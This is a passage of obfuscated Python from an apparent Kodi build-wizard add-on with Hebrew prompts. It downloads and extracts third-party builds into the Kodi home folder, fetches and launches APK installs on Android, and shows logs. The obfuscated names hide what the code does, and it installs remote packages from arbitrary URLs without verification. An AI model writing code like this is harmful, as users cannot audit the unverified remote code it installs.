			OOOOOOO0O0OOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4278
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'r')#line:4280
			OOO0O0O00O0O000OO =O0OO00O0O00O00O0O .read ()#line:4281
			O0OO00O0O00O00O0O .close ()#line:4282
			O00000OO00O0OO00O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:4283
			OOO0O000O0O00OOOO =re .compile (O00000OO00O0OO00O ).findall (OOO0O0O00O0O000OO )[0 ]#line:4284
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'w')#line:4285
			O0OO00O0O00O00O0O .write (OOO0O0O00O0O000OO .replace ('<setting id="show.cdart" type="bool%s/setting>'%OOO0O000O0O00OOOO ,'<setting id="show.cdart" type="bool">false</setting>'))#line:4286
			O0OO00O0O00O00O0O .close ()#line:4287
			OOOOOOO0O0OOOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:4291
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'r')#line:4293
			OOO0O0O00O0O000OO =O0OO00O0O00O00O0O .read ()#line:4294
			O0OO00O0O00O00O0O .close ()#line:4295
			O00000OO00O0OO00O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:4296
			OOO0O000O0O00OOOO =re .compile (O00000OO00O0OO00O ).findall (OOO0O0O00O0O000OO )[0 ]#line:4297
			O0OO00O0O00O00O0O =open (OOOOOOO0O0OOOOO0O ,'w')#line:4298
			O0OO00O0O00O00O0O .write (OOO0O0O00O0O000OO .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OOO0O000O0O00OOOO ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:4299
			O0OO00O0O00O00O0O .close ()#line:4300
		except :#line:4305
			pass #line:4306
def thirdPartyInstall (OO0O0OO0O0O0O0OOO ,O0OO00OO00000OOOO ):#line:4308
	if not wiz .workingURL (O0OO00OO00000OOOO ):#line:4309
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:4310
	O000OOOO0OO0O0O00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO0O0OO0O0O0O0OOO ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:4311
	if O000OOOO0OO0O0O00 ==1 :#line:4312
		freshStart ('third',True )#line:4313
	wiz .clearS ('build')#line:4314
	OO0000OOO0000OOOO =OO0O0OO0O0O0O0OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4315
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4316
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0O0O0O0OOO ),'','אנא המתן')#line:4317
	OO0000OO0OO00O0OO =os .path .join (PACKAGES ,'%s.zip'%OO0000OOO0000OOOO )#line:4318
	try :os .remove (OO0000OO0OO00O0OO )#line:4319
	except :pass #line:4320
	downloader .download (O0OO00OO00000OOOO ,OO0000OO0OO00O0OO ,DP )#line:4321
	xbmc .sleep (1000 )#line:4322
	O0O0OOOO0OOOO000O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0O0O0O0OOO )#line:4323
	DP .update (0 ,O0O0OOOO0OOOO000O ,'','אנא המתן')#line:4324
	O0OO0O0O0O000O0OO ,OO0O0O0000O0000O0 ,OOOOO00OOO0OOO000 =extract .all (OO0000OO0OO00O0OO ,HOME ,DP ,title =O0O0OOOO0OOOO000O )#line:4325
	if int (float (O0OO0O0O0O000O0OO ))>0 :#line:4326
		wiz .fixmetas ()#line:4327
		wiz .lookandFeelData ('save')#line:4328
		wiz .defaultSkin ()#line:4329
		wiz .setS ('installed','true')#line:4331
		wiz .setS ('extract',str (O0OO0O0O0O000O0OO ))#line:4332
		wiz .setS ('errors',str (OO0O0O0000O0000O0 ))#line:4333
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O0OO0O0O0O000O0OO ,OO0O0O0000O0000O0 ))#line:4334
		try :os .remove (OO0000OO0OO00O0OO )#line:4335
		except :pass #line:4336
		if int (float (OO0O0O0000O0000O0 ))>0 :#line:4337
			O0000O0O000OOOO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO0O0OO0O0O0O0OOO ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O0OO0O0O0O000O0OO ,'%',COLOR1 ,OO0O0O0000O0000O0 ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:4338
			if O0000O0O000OOOO00 :#line:4339
				if isinstance (OO0O0O0000O0000O0 ,unicode ):#line:4340
					OOOOO00OOO0OOO000 =OOOOO00OOO0OOO000 .encode ('utf-8')#line:4341
				wiz .TextBox (ADDONTITLE ,OOOOO00OOO0OOO000 )#line:4342
	DP .close ()#line:4343
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:4344
	if INSTALLMETHOD ==1 :OO00OOOO0000OO0OO =1 #line:4345
	elif INSTALLMETHOD ==2 :OO00OOOO0000OO0OO =0 #line:4346
	else :OO00OOOO0000OO0OO =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:4347
	if OO00OOOO0000OO0OO ==1 :wiz .reloadFix ()#line:4348
	else :wiz .killxbmc (True )#line:4349
def testTheme (O0000OOOOO0OOOOOO ):#line:4351
	OO0O0O0O0O0OO0O00 =zipfile .ZipFile (O0000OOOOO0OOOOOO )#line:4352
	for O00O000OOOO00OO00 in OO0O0O0O0O0OO0O00 .infolist ():#line:4353
		if '/settings.xml'in O00O000OOOO00OO00 .filename :#line:4354
			return True #line:4355
	return False #line:4356
def testGui (O0O0OOOO0O00O0OO0 ):#line:4358
	O0OO0O0O00O000OO0 =zipfile .ZipFile (O0O0OOOO0O00O0OO0 )#line:4359
	for O0OOOOO0O0O0OOOO0 in O0OO0O0O00O000OO0 .infolist ():#line:4360
		if '/guisettings.xml'in O0OOOOO0O0O0OOOO0 .filename :#line:4361
			return True #line:4362
	return False #line:4363
def apkInstaller (O00OOOOOO0OOO0OO0 ,OO000000000O00OO0 ):#line:4365
	wiz .log (O00OOOOOO0OOO0OO0 )#line:4366
	wiz .log (OO000000000O00OO0 )#line:4367
	if wiz .platform ()=='android':#line:4368
		OO0000OO0OO00000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OOOOOO0OOO0OO0 ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4369
		if not OO0000OO0OO00000O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4370
		O0O0OOO0000O00OOO =O00OOOOOO0OOO0OO0 #line:4371
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4372
		if not wiz .workingURL (OO000000000O00OO0 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4373
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0OOO0000O00OOO ),'','אנא המתן')#line:4374
		OOO00O000OO000O0O =os .path .join (PACKAGES ,"%s.apk"%O00OOOOOO0OOO0OO0 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4375
		try :os .remove (OOO00O000OO000O0O )#line:4376
		except :pass #line:4377
		downloader .download (OO000000000O00OO0 ,OOO00O000OO000O0O ,DP )#line:4378
		xbmc .sleep (100 )#line:4379
		DP .close ()#line:4380
		notify .apkInstaller (O00OOOOOO0OOO0OO0 )#line:4381
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OOO00O000OO000O0O +'")')#line:4382
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4383
def createMenu (OOO000OO0OOOOO00O ,OO0O0O0O0O0OO0OOO ,OOO0O0O0OOO000O00 ):#line:4389
	if OOO000OO0OOOOO00O =='saveaddon':#line:4390
		OO0O00OOO0O00000O =[]#line:4391
		O000000O00O00O0OO =urllib .quote_plus (OO0O0O0O0O0OO0OOO .lower ().replace (' ',''))#line:4392
		O0O0O0O0OO0000000 =OO0O0O0O0O0OO0OOO .replace ('Debrid','Real Debrid')#line:4393
		OOOOOOO00O0000O0O =urllib .quote_plus (OOO0O0O0OOO000O00 .lower ().replace (' ',''))#line:4394
		OOO0O0O0OOO000O00 =OOO0O0O0OOO000O00 .replace ('url','URL Resolver')#line:4395
		OO0O00OOO0O00000O .append ((THEME2 %OOO0O0O0OOO000O00 .title (),' '))#line:4396
		OO0O00OOO0O00000O .append ((THEME3 %'Save %s Data'%O0O0O0O0OO0000000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O000000O00O00O0OO ,OOOOOOO00O0000O0O )))#line:4397
		OO0O00OOO0O00000O .append ((THEME3 %'Restore %s Data'%O0O0O0O0OO0000000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O000000O00O00O0OO ,OOOOOOO00O0000O0O )))#line:4398
		OO0O00OOO0O00000O .append ((THEME3 %'Clear %s Data'%O0O0O0O0OO0000000 ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O000000O00O00O0OO ,OOOOOOO00O0000O0O )))#line:4399
	elif OOO000OO0OOOOO00O =='save':#line:4400
		OO0O00OOO0O00000O =[]#line:4401
		O000000O00O00O0OO =urllib .quote_plus (OO0O0O0O0O0OO0OOO .lower ().replace (' ',''))#line:4402
		O0O0O0O0OO0000000 =OO0O0O0O0O0OO0OOO .replace ('Debrid','Real Debrid')#line:4403
		OOOOOOO00O0000O0O =urllib .quote_plus (OOO0O0O0OOO000O00 .lower ().replace (' ',''))#line:4404
		OOO0O0O0OOO000O00 =OOO0O0O0OOO000O00 .replace ('url','URL Resolver')#line:4405
		OO0O00OOO0O00000O .append ((THEME2 %OOO0O0O0OOO000O00 .title (),' '))#line:4406
		OO0O00OOO0O00000O .append ((THEME3 %'Register %s'%O0O0O0O0OO0000000 ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O000000O00O00O0OO ,OOOOOOO00O0000O0O )))#line:4407
		OO0O00OOO0O00000O .append ((THEME3 %'Save %s Data'%O0O0O0O0OO0000000 ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O000000O00O00O0OO ,OOOOOOO00O0000O0O )))#line:4408
		OO0O00OOO0O00000O .append ((THEME3 %'Restore %s Data'%O0O0O0O0OO0000000 ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O000000O00O00O0OO ,OOOOOOO00O0000O0O )))#line:4409
		OO0O00OOO0O00000O .append ((THEME3 %'Import %s Data'%O0O0O0O0OO0000000 ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O000000O00O00O0OO ,OOOOOOO00O0000O0O )))#line:4410
		OO0O00OOO0O00000O .append ((THEME3 %'Clear Addon %s Data'%O0O0O0O0OO0000000 ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O000000O00O00O0OO ,OOOOOOO00O0000O0O )))#line:4411
	elif OOO000OO0OOOOO00O =='install':#line:4412
		OO0O00OOO0O00000O =[]#line:4413
		OOOOOOO00O0000O0O =urllib .quote_plus (OOO0O0O0OOO000O00 )#line:4414
		OO0O00OOO0O00000O .append ((THEME2 %OOO0O0O0OOO000O00 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,OOOOOOO00O0000O0O )))#line:4415
		OO0O00OOO0O00000O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,OOOOOOO00O0000O0O )))#line:4416
		OO0O00OOO0O00000O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,OOOOOOO00O0000O0O )))#line:4417
		OO0O00OOO0O00000O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,OOOOOOO00O0000O0O )))#line:4418
		OO0O00OOO0O00000O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,OOOOOOO00O0000O0O )))#line:4419
	OO0O00OOO0O00000O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4420
	return OO0O00OOO0O00000O #line:4421
def toggleCache (O000OO00OO00O00O0 ):#line:4423
	OO0000OOO0OO0OO00 =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4424
	OOO00O0OOO0O0OOO0 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4425
	if O000OO00OO00O00O0 in ['true','false']:#line:4426
		for OO0OO0O0O000OOO0O in OO0000OOO0OO0OO00 :#line:4427
			wiz .setS (OO0OO0O0O000OOO0O ,O000OO00OO00O00O0 )#line:4428
	else :#line:4429
		if not O000OO00OO00O00O0 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4430
			try :#line:4431
				OO0OO0O0O000OOO0O =OOO00O0OOO0O0OOO0 [OO0000OOO0OO0OO00 .index (O000OO00OO00O00O0 )]#line:4432
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO0OO0O0O000OOO0O ))#line:4433
			except :#line:4434
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O000OO00OO00O00O0 ))#line:4435
		else :#line:4436
			OOOO0O0O000000OOO ='true'if wiz .getS (O000OO00OO00O00O0 )=='false'else 'false'#line:4437
			wiz .setS (O000OO00OO00O00O0 ,OOOO0O0O000000OOO )#line:4438
def playVideo (OO000O0O0OOO00O00 ):#line:4440
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%OO000O0O0OOO00O00 )#line:4441
	if 'watch?v='in OO000O0O0OOO00O00 :#line:4442
		O0O0000O00O000OO0 ,OO0000O0OOO0OO00O =OO000O0O0OOO00O00 .split ('?')#line:4443
		OO0OOO00OOO0OOO00 =OO0000O0OOO0OO00O .split ('&')#line:4444
		for O0OO0O0O00000000O in OO0OOO00OOO0OOO00 :#line:4445
			if O0OO0O0O00000000O .startswith ('v='):#line:4446
				OO000O0O0OOO00O00 =O0OO0O0O00000000O [2 :]#line:4447
				break #line:4448
			else :continue #line:4449
	elif 'embed'in OO000O0O0OOO00O00 or 'youtu.be'in OO000O0O0OOO00O00 :#line:4450
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%OO000O0O0OOO00O00 )#line:4451
		O0O0000O00O000OO0 =OO000O0O0OOO00O00 .split ('/')#line:4452
		if len (O0O0000O00O000OO0 [-1 ])>5 :#line:4453
			OO000O0O0OOO00O00 =O0O0000O00O000OO0 [-1 ]#line:4454
		elif len (O0O0000O00O000OO0 [-2 ])>5 :#line:4455
			OO000O0O0OOO00O00 =O0O0000O00O000OO0 [-2 ]#line:4456
	wiz .log ("YouTube URL: %s"%OO000O0O0OOO00O00 )#line:4457
	yt .PlayVideo (OO000O0O0OOO00O00 )#line:4458
def viewLogFile ():#line:4460
	OO0O0OO0OOOO0OO0O =wiz .Grab_Log (True )#line:4461
	O00OO0000OOO0OOOO =wiz .Grab_Log (True ,True )#line:4462
	O0O00000O0O0OOO0O =0 ;OO00000OO00OOOOOO =OO0O0OO0OOOO0OO0O #line:4463
	if not O00OO0000OOO0OOOO ==False and not OO0O0OO0OOOO0OO0O ==False :#line:4464
		O0O00000O0O0OOO0O =DIALOG .select (ADDONTITLE ,["View %s"%OO0O0OO0OOOO0OO0O .replace (LOG ,""),"View %s"%O00OO0000OOO0OOOO .replace (LOG ,"")])#line:4465
		if O0O00000O0O0OOO0O ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4466
	elif OO0O0OO0OOOO0OO0O ==False and O00OO0000OOO0OOOO ==False :#line:4467
		wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4468
		return #line:4469
	elif not OO0O0OO0OOOO0OO0O ==False :O0O00000O0O0OOO0O =0 #line:4470
	elif not O00OO0000OOO0OOOO ==False :O0O00000O0O0OOO0O =1 #line:4471
	OO00000OO00OOOOOO =OO0O0OO0OOOO0OO0O if O0O00000O0O0OOO0O ==0 else O00OO0000OOO0OOOO #line:4473
	O00OOO0O00OOO0O0O =wiz .Grab_Log (False )if O0O00000O0O0OOO0O ==0 else wiz .Grab_Log (False ,True )#line:4474
	wiz .TextBox ("%s - %s"%(ADDONTITLE ,OO00000OO00OOOOOO ),O00OOO0O00OOO0O0O )#line:4476
def errorChecking (log =None ,count =None ,all =None ):#line:4478
	if log ==None :#line:4479
		OOO000000O000O0OO =wiz .Grab_Log (True )#line:4480
		OOO00O0000O0O0OO0 =wiz .Grab_Log (True ,True )#line:4481
		if not OOO00O0000O0O0OO0 ==False and not OOO000000O000O0OO ==False :#line:4482
			OO00OO0O00O0O00OO =DIALOG .select (ADDONTITLE ,["View %s: %s error(s)"%(OOO000000O000O0OO .replace (LOG ,""),errorChecking (OOO000000O000O0OO ,True ,True )),"View %s: %s error(s)"%(OOO00O0000O0O0OO0 .replace (LOG ,""),errorChecking (OOO00O0000O0O0OO0 ,True ,True ))])#line:4483
			if OO00OO0O00O0O00OO ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4484
		elif OOO000000O000O0OO ==False and OOO00O0000O0O0OO0 ==False :#line:4485
			wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]No Log File Found![/COLOR]'%COLOR2 )#line:4486
			return #line:4487
		elif not OOO000000O000O0OO ==False :OO00OO0O00O0O00OO =0 #line:4488
		elif not OOO00O0000O0O0OO0 ==False :OO00OO0O00O0O00OO =1 #line:4489
		log =OOO000000O000O0OO if OO00OO0O00O0O00OO ==0 else OOO00O0000O0O0OO0 #line:4490
	if log ==False :#line:4491
		if count ==None :#line:4492
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Log File not Found[/COLOR]"%COLOR2 )#line:4493
			return False #line:4494
		else :#line:4495
			return 0 #line:4496
	else :#line:4497
		if os .path .exists (log ):#line:4498
			OO0OO0OOO00OO0000 =open (log ,mode ='r');OOO00OOOO000O0000 =OO0OO0OOO00OO0000 .read ().replace ('\n','').replace ('\r','');OO0OO0OOO00OO0000 .close ()#line:4499
			OOO0OO0000000O00O =re .compile ("-->Python callback/script returned the following error<--(.+?)-->End of Python script error report<--").findall (OOO00OOOO000O0000 )#line:4500
			if not count ==None :#line:4501
				if all ==None :#line:4502
					OOO0O00O0OOO0OO00 =0 #line:4503
					for OOOOOOO0O0O000000 in OOO0OO0000000O00O :#line:4504
						if ADDON_ID in OOOOOOO0O0O000000 :OOO0O00O0OOO0OO00 +=1 #line:4505
					return OOO0O00O0OOO0OO00 #line:4506
				else :return len (OOO0OO0000000O00O )#line:4507
			if len (OOO0OO0000000O00O )>0 :#line:4508
				OOO0O00O0OOO0OO00 =0 ;O0O00OOO0OOO0O000 =""#line:4509
				for OOOOOOO0O0O000000 in OOO0OO0000000O00O :#line:4510
					if all ==None and not ADDON_ID in OOOOOOO0O0O000000 :continue #line:4511
					else :#line:4512
						OOO0O00O0OOO0OO00 +=1 #line:4513
						O0O00OOO0OOO0O000 +="[COLOR red]Error Number %s[/COLOR]\n(PythonToCppException) : -->Python callback/script returned the following error<--%s-->End of Python script error report<--\n\n"%(OOO0O00O0OOO0OO00 ,OOOOOOO0O0O000000 .replace ('                                          ','\n').replace ('\\\\','\\').replace (HOME ,''))#line:4514
				if OOO0O00O0OOO0OO00 >0 :#line:4515
					wiz .TextBox (ADDONTITLE ,O0O00OOO0OOO0O000 )#line:4516
				else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4517
			else :wiz .LogNotify (ADDONTITLE ,"No Errors Found in Log")#line:4518
		else :wiz .LogNotify (ADDONTITLE ,"Log File not Found")#line:4519
ACTION_PREVIOUS_MENU =10 #line:4521
ACTION_NAV_BACK =92 #line:4522
ACTION_MOVE_LEFT =1 #line:4523
ACTION_MOVE_RIGHT =2 #line:4524
ACTION_MOVE_UP =3 #line:4525
ACTION_MOVE_DOWN =4 #line:4526
ACTION_MOUSE_WHEEL_UP =104 #line:4527
ACTION_MOUSE_WHEEL_DOWN =105 #line:4528
ACTION_MOVE_MOUSE =107 #line:4529
ACTION_SELECT_ITEM =7 #line:4530
ACTION_BACKSPACE =110 #line:4531
ACTION_MOUSE_LEFT_CLICK =100 #line:4532
ACTION_MOUSE_LONG_CLICK =108 #line:4533
def LogViewer (default =None ):#line:4535
	class OOOOO0O0O00OOOOOO (xbmcgui .WindowXMLDialog ):#line:4536
		def __init__ (O0O000OOO000O0O00 ,*O0000OO0OO00O0000 ,**OO00O0O00O00OO0O0 ):#line:4537
			O0O000OOO000O0O00 .default =OO00O0O00O00OO0O0 ['default']#line:4538
		def onInit (O000OOOO0OO000OO0 ):#line:4540
			O000OOOO0OO000OO0 .title =101 #line:4541
			O000OOOO0OO000OO0 .msg =102 #line:4542
			O000OOOO0OO000OO0 .scrollbar =103 #line:4543
			O000OOOO0OO000OO0 .upload =201 #line:4544
			O000OOOO0OO000OO0 .kodi =202 #line:4545
			O000OOOO0OO000OO0 .kodiold =203 #line:4546
			O000OOOO0OO000OO0 .wizard =204 #line:4547
			O000OOOO0OO000OO0 .okbutton =205 #line:4548
			O00000OO00OOOO0OO =open (O000OOOO0OO000OO0 .default ,'r')#line:4549
			O000OOOO0OO000OO0 .logmsg =O00000OO00OOOO0OO .read ()#line:4550
			O00000OO00OOOO0OO .close ()#line:4551
			O000OOOO0OO000OO0 .titlemsg ="%s: %s"%(ADDONTITLE ,O000OOOO0OO000OO0 .default .replace (LOG ,'').replace (ADDONDATA ,''))#line:4552
			O000OOOO0OO000OO0 .showdialog ()#line:4553
		def showdialog (O0000OOOOOO0O000O ):#line:4555
			O0000OOOOOO0O000O .getControl (O0000OOOOOO0O000O .title ).setLabel (O0000OOOOOO0O000O .titlemsg )#line:4556
			O0000OOOOOO0O000O .getControl (O0000OOOOOO0O000O .msg ).setText (wiz .highlightText (O0000OOOOOO0O000O .logmsg ))#line:4557
			O0000OOOOOO0O000O .setFocusId (O0000OOOOOO0O000O .scrollbar )#line:4558
		def onClick (O0OO000O0OOOOO00O ,O000O0OOOOOO000OO ):#line:4560
			if O000O0OOOOOO000OO ==O0OO000O0OOOOO00O .okbutton :O0OO000O0OOOOO00O .close ()#line:4561
			elif O000O0OOOOOO000OO ==O0OO000O0OOOOO00O .upload :O0OO000O0OOOOO00O .close ();uploadLog .Main ()#line:4562
			elif O000O0OOOOOO000OO ==O0OO000O0OOOOO00O .kodi :#line:4563
				OO0O0O00O00OO000O =wiz .Grab_Log (False )#line:4564
				OO0OOOO000O0O0000 =wiz .Grab_Log (True )#line:4565
				if OO0O0O00O00OO000O ==False :#line:4566
					O0OO000O0OOOOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4567
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .msg ).setText ("Log File Does Not Exists!")#line:4568
				else :#line:4569
					O0OO000O0OOOOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOO000O0O0000 .replace (LOG ,''))#line:4570
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .title ).setLabel (O0OO000O0OOOOO00O .titlemsg )#line:4571
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .msg ).setText (wiz .highlightText (OO0O0O00O00OO000O ))#line:4572
					O0OO000O0OOOOO00O .setFocusId (O0OO000O0OOOOO00O .scrollbar )#line:4573
			elif O000O0OOOOOO000OO ==O0OO000O0OOOOO00O .kodiold :#line:4574
				OO0O0O00O00OO000O =wiz .Grab_Log (False ,True )#line:4575
				OO0OOOO000O0O0000 =wiz .Grab_Log (True ,True )#line:4576
				if OO0O0O00O00OO000O ==False :#line:4577
					O0OO000O0OOOOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4578
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .msg ).setText ("Log File Does Not Exists!")#line:4579
				else :#line:4580
					O0OO000O0OOOOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOO000O0O0000 .replace (LOG ,''))#line:4581
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .title ).setLabel (O0OO000O0OOOOO00O .titlemsg )#line:4582
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .msg ).setText (wiz .highlightText (OO0O0O00O00OO000O ))#line:4583
					O0OO000O0OOOOO00O .setFocusId (O0OO000O0OOOOO00O .scrollbar )#line:4584
			elif O000O0OOOOOO000OO ==O0OO000O0OOOOO00O .wizard :#line:4585
				OO0O0O00O00OO000O =wiz .Grab_Log (False ,False ,True )#line:4586
				OO0OOOO000O0O0000 =wiz .Grab_Log (True ,False ,True )#line:4587
				if OO0O0O00O00OO000O ==False :#line:4588
					O0OO000O0OOOOO00O .titlemsg ="%s: View Log Error"%ADDONTITLE #line:4589
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .msg ).setText ("Log File Does Not Exists!")#line:4590
				else :#line:4591
					O0OO000O0OOOOO00O .titlemsg ="%s: %s"%(ADDONTITLE ,OO0OOOO000O0O0000 .replace (ADDONDATA ,''))#line:4592
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .title ).setLabel (O0OO000O0OOOOO00O .titlemsg )#line:4593
					O0OO000O0OOOOO00O .getControl (O0OO000O0OOOOO00O .msg ).setText (wiz .highlightText (OO0O0O00O00OO000O ))#line:4594
					O0OO000O0OOOOO00O .setFocusId (O0OO000O0OOOOO00O .scrollbar )#line:4595
		def onAction (OO0OO000O0O0OOO0O ,O0O000O000OO00OOO ):#line:4597
			if O0O000O000OO00OOO ==ACTION_PREVIOUS_MENU :OO0OO000O0O0OOO0O .close ()#line:4598
			elif O0O000O000OO00OOO ==ACTION_NAV_BACK :OO0OO000O0O0OOO0O .close ()#line:4599
	if default ==None :default =wiz .Grab_Log (True )#line:4600
	OOOO0O0OO0O0OOOO0 =OOOOO0O0O00OOOOOO ("LogViewer.xml",ADDON .getAddonInfo ('path'),'DefaultSkin',default =default )#line:4601
	OOOO0O0OO0O0OOOO0 .doModal ()#line:4602
	del OOOO0O0OO0O0OOOO0 #line:4603
def removeAddon (OOOOOOOO00OO0O00O ,O00O0O0O0OO00OOO0 ,over =False ):#line:4605
	if not over ==False :#line:4606
		OOOOO0OO000OO0OO0 =1 #line:4607
	else :#line:4608
		OOOOO0OO000OO0OO0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Are you sure you want to delete the addon:'%COLOR2 ,'Name: [COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0O0O0OO00OOO0 ),'ID: [COLOR %s]%s[/COLOR][/COLOR]'%(COLOR1 ,OOOOOOOO00OO0O00O ),yeslabel ='[B][COLOR green]Remove Addon[/COLOR][/B]',nolabel ='[B][COLOR red]Don\'t Remove[/COLOR][/B]')#line:4609
	if OOOOO0OO000OO0OO0 ==1 :#line:4610
